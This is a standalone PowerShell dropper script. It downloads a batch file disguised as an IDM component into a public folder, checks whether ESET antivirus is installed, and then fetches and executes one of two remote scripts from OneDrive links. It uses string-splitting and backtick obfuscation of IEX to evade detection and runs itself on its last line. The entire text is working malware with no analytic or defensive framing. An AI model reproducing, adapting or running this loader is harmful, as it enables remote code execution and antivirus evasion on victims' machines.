Function hhhhhcccst
{
(New-Object System.Net.WebClient).DownloadFile('https://onedrive.live.com/download?cid=BA50F5CA8E2D0C31&resid=BA50F5CA8E2D0C31%214300&authkey=AFlN6y4GJE8bZ3Q', 'C:\Users\Public\Data\IDM.bat')

if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://onedrive.live.com/download?cid=BA50F5CA8E2D0C31&resid=BA50F5CA8E2D0C31%214302&authkey=AAhm8n3PKZvg27E'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
}
else{
$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://onedrive.live.com/download?cid=BA50F5CA8E2D0C31&resid=BA50F5CA8E2D0C31%214301&authkey=AOKPjpmJn2C51Zw'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
}
}
IEX hhhhhcccst